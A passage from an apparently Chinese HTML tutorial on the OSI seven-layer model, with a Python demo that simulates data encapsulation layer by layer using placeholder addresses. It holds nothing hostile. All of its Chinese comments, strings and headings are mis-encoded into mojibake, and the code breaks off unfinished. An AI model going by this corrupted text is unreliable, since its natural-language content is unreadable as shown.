class="hljs-string">TCPå¤´éƒ¨</span>|<span class="hljs-string">æ•°æ®</span>|<span class="hljs-string">å¸§å°¾] â† ç§°ä¸º&quot;å¸§&quot;ï¼ˆFrameï¼‰</span><br><span class="hljs-string">              â†“ è½¬æ¢ä¸ºæ¯”ç‰¹æµ</span><br><span class="hljs-string">ç‰©ç†å±‚ï¼š    01010101010101... â† æ¯”ç‰¹æµï¼ˆBitsï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="ç±»æ¯”ç†è§£">ç±»æ¯”ç†è§£</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ä½ å†™çš„ä¿¡     â†’  åº”ç”¨å±‚æ•°æ®<br>è£…è¿›ä¿¡å°     â†’  ä¼ è¾“å±‚æ·»åŠ ç«¯å£ä¿¡æ¯<br>å†™ä¸Šåœ°å€     â†’  ç½‘ç»œå±‚æ·»åŠ <span class="hljs-built_in">IP</span>åœ°å€<br>æ”¾å…¥åŒ…è£¹ç®±   â†’  æ•°æ®é“¾è·¯å±‚æ·»åŠ MACåœ°å€<br>å¿«é€’è½¦è¿è¾“   â†’  ç‰©ç†å±‚ä¼ è¾“<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šåè®®åˆ†å±‚æ¼”ç¤º">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šåè®®åˆ†å±‚æ¼”ç¤º</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ¨¡æ‹ŸOSIä¸ƒå±‚æ¨¡å‹çš„æ•°æ®å°è£…è¿‡ç¨‹ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day03_osi_demo.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šæ¼”ç¤ºOSIä¸ƒå±‚æ¨¡å‹çš„æ•°æ®å°è£…å’Œè§£å°è£…è¿‡ç¨‹</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OSILayer</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;OSIæ¨¡å‹çš„åŸºç¡€å±‚ç±»&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, layer_num</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.layer_num = layer_num<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å°è£…æ•°æ®ï¼šæ·»åŠ æœ¬å±‚å¤´éƒ¨&quot;&quot;&quot;</span><br>        header = <span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;self.name&#125;</span>å¤´éƒ¨]&quot;</span><br>        <span class="hljs-keyword">return</span> header + data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;è§£å°è£…æ•°æ®ï¼šç§»é™¤æœ¬å±‚å¤´éƒ¨&quot;&quot;&quot;</span><br>        header = <span class="hljs-string">f&quot;[<span class="hljs-subst">&#123;self.name&#125;</span>å¤´éƒ¨]&quot;</span><br>        <span class="hljs-keyword">if</span> data.startswith(header):<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-built_in">len</span>(header):]<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PhysicalLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç‰©ç†å±‚ï¼šç¬¬1å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;ç‰©ç†å±‚&quot;</span>, <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å°†æ•°æ®è½¬æ¢ä¸ºæ¯”ç‰¹æµ&quot;&quot;&quot;</span><br>        bits = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“¡ <span class="hljs-subst">&#123;self.name&#125;</span>: å°†æ•°æ®è½¬æ¢ä¸ºæ¯”ç‰¹æµ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ¯”ç‰¹æµ(å‰64ä½): <span class="hljs-subst">&#123;bits[:<span class="hljs-number">64</span>]&#125;</span>...&quot;</span>)<br>        <span class="hljs-keyword">return</span> bits<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, bits</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å°†æ¯”ç‰¹æµè½¬æ¢ä¸ºæ•°æ®&quot;&quot;&quot;</span><br>        chars = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>            byte = bits[i:i+<span class="hljs-number">8</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte) == <span class="hljs-number">8</span>:<br>                chars.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>)))<br>        data = <span class="hljs-string">&#x27;&#x27;</span>.join(chars)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“¡ <span class="hljs-subst">&#123;self.name&#125;</span>: å°†æ¯”ç‰¹æµè½¬æ¢ä¸ºæ•°æ®&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataLinkLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;æ•°æ®é“¾è·¯å±‚ï¼šç¬¬2å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;æ•°æ®é“¾è·¯å±‚&quot;</span>, <span class="hljs-number">2</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ·»åŠ MACåœ°å€ï¼ˆå¸§å¤´å’Œå¸§å°¾ï¼‰&quot;&quot;&quot;</span><br>        mac_src = <span class="hljs-string">&quot;AA:BB:CC:DD:EE:FF&quot;</span>  <span class="hljs-comment"># æºMACåœ°å€</span><br>        mac_dst = <span class="hljs-string">&quot;11:22:33:44:55:66&quot;</span>  <span class="hljs-comment"># ç›®æ ‡MACåœ°å€</span><br>        frame = <span class="hljs-string">f&quot;[å¸§å¤´|æºMAC:<span class="hljs-subst">&#123;mac_src&#125;</span>|ç›®æ ‡MAC:<span class="hljs-subst">&#123;mac_dst&#125;</span>]<span class="hljs-subst">&#123;data&#125;</span>[å¸§å°¾|CRCæ ¡éªŒ]&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”— <span class="hljs-subst">&#123;self.name&#125;</span>: æ·»åŠ MACåœ°å€&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºMAC: <span class="hljs-subst">&#123;mac_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡MAC: <span class="hljs-subst">&#123;mac_dst&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> frame<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, frame</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;ç§»é™¤MACåœ°å€&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># ç®€åŒ–å¤„ç†ï¼šç§»é™¤å¸§å¤´å’Œå¸§å°¾</span><br>        start = frame.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        end = frame.rfind(<span class="hljs-string">&quot;[&quot;</span>)<br>        data = frame[start:end]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ”— <span class="hljs-subst">&#123;self.name&#125;</span>: ç§»é™¤MACåœ°å€&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ç½‘ç»œå±‚ï¼šç¬¬3å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;ç½‘ç»œå±‚&quot;</span>, <span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ·»åŠ IPåœ°å€&quot;&quot;&quot;</span><br>        ip_src = <span class="hljs-string">&quot;192.168.1.100&quot;</span>  <span class="hljs-comment"># æºIPåœ°å€</span><br>        ip_dst = <span class="hljs-string">&quot;93.184.216.34&quot;</span>  <span class="hljs-comment"># ç›®æ ‡IPåœ°å€ï¼ˆexample.comï¼‰</span><br>        packet = <span class="hljs-string">f&quot;[IPå¤´|æºIP:<span class="hljs-subst">&#123;ip_src&#125;</span>|ç›®æ ‡IP:<span class="hljs-subst">&#123;ip_dst&#125;</span>|TTL:64]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸŒ <span class="hljs-subst">&#123;self.name&#125;</span>: æ·»åŠ IPåœ°å€&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºIP: <span class="hljs-subst">&#123;ip_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡IP: <span class="hljs-subst">&#123;ip_dst&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> packet<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, packet</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;ç§»é™¤IPå¤´éƒ¨&quot;&quot;&quot;</span><br>        start = packet.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸŒ <span class="hljs-subst">&#123;self.name&#125;</span>: ç§»é™¤IPå¤´éƒ¨&quot;</span>)<br>        <span class="hljs-keyword">return</span> start <span class="hljs-keyword">and</span> packet[start:] <span class="hljs-keyword">or</span> packet<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TransportLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ä¼ è¾“å±‚ï¼šç¬¬4å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;ä¼ è¾“å±‚&quot;</span>, <span class="hljs-number">4</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ·»åŠ ç«¯å£å·ï¼ˆTCPå¤´éƒ¨ï¼‰&quot;&quot;&quot;</span><br>        port_src = <span class="hljs-number">54321</span>  <span class="hljs-comment"># æºç«¯å£</span><br>        port_dst = <span class="hljs-number">80</span>     <span class="hljs-comment"># ç›®æ ‡ç«¯å£ï¼ˆHTTPï¼‰</span><br>        segment = <span class="hljs-string">f&quot;[TCPå¤´|æºç«¯å£:<span class="hljs-subst">&#123;port_src&#125;</span>|ç›®æ ‡ç«¯å£:<span class="hljs-subst">&#123;port_dst&#125;</span>|åºå·:12345]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸšš <span class="hljs-subst">&#123;self.name&#125;</span>: æ·»åŠ ç«¯å£å·ï¼ˆTCPåè®®ï¼‰&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æºç«¯å£: <span class="hljs-subst">&#123;port_src&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç›®æ ‡ç«¯å£: <span class="hljs-subst">&#123;port_dst&#125;</span> (HTTP)&quot;</span>)<br>        <span class="hljs-keyword">return</span> segment<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, segment</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;ç§»é™¤TCPå¤´éƒ¨&quot;&quot;&quot;</span><br>        start = segment.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸšš <span class="hljs-subst">&#123;self.name&#125;</span>: ç§»é™¤TCPå¤´éƒ¨&quot;</span>)<br>        <span class="hljs-keyword">return</span> segment[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;ä¼šè¯å±‚ï¼šç¬¬5å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;ä¼šè¯å±‚&quot;</span>, <span class="hljs-number">5</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å»ºç«‹ä¼šè¯&quot;&quot;&quot;</span><br>        session_id = <span class="hljs-string">&quot;SESSION-20250105-12345&quot;</span><br>        session_data = <span class="hljs-string">f&quot;[ä¼šè¯å¤´|ä¼šè¯ID:<span class="hljs-subst">&#123;session_id&#125;</span>]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ’¬ <span class="hljs-subst">&#123;self.name&#125;</span>: å»ºç«‹ä¼šè¯&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ä¼šè¯ID: <span class="hljs-subst">&#123;session_id&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> session_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;ç»ˆæ­¢ä¼šè¯&quot;&quot;&quot;</span><br>        start = data.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ’¬ <span class="hljs-subst">&#123;self.name&#125;</span>: è§£æä¼šè¯ä¿¡æ¯&quot;</span>)<br>        <span class="hljs-keyword">return</span> data[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PresentationLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;è¡¨ç¤ºå±‚ï¼šç¬¬6å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;è¡¨ç¤ºå±‚&quot;</span>, <span class="hljs-number">6</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ•°æ®æ ¼å¼è½¬æ¢&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># è¿™é‡Œç®€åŒ–ä¸ºæ·»åŠ ç¼–ç ä¿¡æ¯</span><br>        formatted_data = <span class="hljs-string">f&quot;[æ ¼å¼|ç¼–ç :UTF-8|å‹ç¼©:æ— |åŠ å¯†:æ— ]<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ¨ <span class="hljs-subst">&#123;self.name&#125;</span>: æ•°æ®æ ¼å¼å¤„ç†&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ç¼–ç : UTF-8&quot;</span>)<br>        <span class="hljs-keyword">return</span> formatted_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;æ•°æ®æ ¼å¼è¿˜åŸ&quot;&quot;&quot;</span><br>        start = data.find(<span class="hljs-string">&quot;]&quot;</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ¨ <span class="hljs-subst">&#123;self.name&#125;</span>: æ•°æ®æ ¼å¼è¿˜åŸ&quot;</span>)<br>        <span class="hljs-keyword">return</span> data[start:]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationLayer</span>(<span class="hljs-title class_ inherited__">OSILayer</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;åº”ç”¨å±‚ï¼šç¬¬7å±‚&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">&quot;åº”ç”¨å±‚&quot;</span>, <span class="hljs-number">7</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;ç”ŸæˆHTTPè¯·æ±‚&quot;&quot;&quot;</span><br>        http_request = <span class="hljs-string">f&quot;GET / HTTP/1.1\\nHost: example.com\\n\\n<span class="hljs-subst">&#123;data&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“± <span class="hljs-subst">&#123;self.name&#125;</span>: ç”ŸæˆHTTPè¯·æ±‚&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   è¯·æ±‚: GET / HTTP/1.1&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   ä¸»æœº: example.com&quot;</span>)<br>        <span class="hljs-keyword">return</span> http_request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decapsulate</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;è§£æHTTPå“åº”&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ“± <span class="hljs-subst">&#123;self.name&#125;</span>: è§£æHTTPå“åº”&quot;</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OSIModel</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;OSIä¸ƒå±‚æ¨¡å‹&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># åˆ›å»ºå„å±‚å¯¹è±¡</span><br>        <span class="hljs-variable language_">self</span>.layers = [<br>            ApplicationLayer(),    <span class="hljs-comment"># ç¬¬7å±‚</span><br>            PresentationLayer(),   <span class="hljs-comment"># ç¬¬6å±‚</span><br>            SessionLayer(),        <span class="hljs-comment"># ç¬¬5å±‚</span><br>            TransportLayer(),      <span class="hljs-comment"># ç¬¬4å±‚</span><br>            NetworkLayer(),        <span class="hljs-comment"># ç¬¬3å±‚</span><br>            DataLinkLayer(),       <span class="hljs-comment"># ç¬¬2å±‚</span><br>            PhysicalLayer(),       <span class="hljs-comment"># ç¬¬1å±‚</span><br>        ]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_data</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;å‘é€æ•°æ®ï¼šä»åº”ç”¨å±‚åˆ°ç‰©ç†å±‚&quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ“¤ æ•°æ®å‘é€è¿‡ç¨‹ï¼ˆå°è£…ï¼‰&quot;</span>.center(<span class="hljs-number">70</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nåŸå§‹æ•°æ®: <span class="hljs-subst">&#123;data&#125;</span>\n&quot;</span>)<br><br>        current_data = data<br><br>        <span class="hljs-comment"># ä»åº”ç”¨å±‚åˆ°ç‰©ç†å±‚ï¼Œé€å±‚å°è£…</span><br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.layers:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;â–¼&#x27;</span> * <span class="hljs-number">35</span>&#125;</span>&quot;</span>)<br>            current_data = layer.encapsulate(current_data)<br>            <span class="hljs-keyword">if</span> layer.layer_num &gt; <span class="hljs-number">1</span>:  <span class="hljs-comment"># ç‰©ç†å±‚çš„è¾“å‡ºå¤ªé•¿ï¼Œä¸æ˜¾ç¤ºå®Œæ•´æ•°æ®</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   æ•°æ®é•¿åº¦: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(current_data)&#125;</span> å­—ç¬¦&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-keyword">return</span> current_data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_data</span>(<span class="hljs-params">self, data</span>):<br>        <span 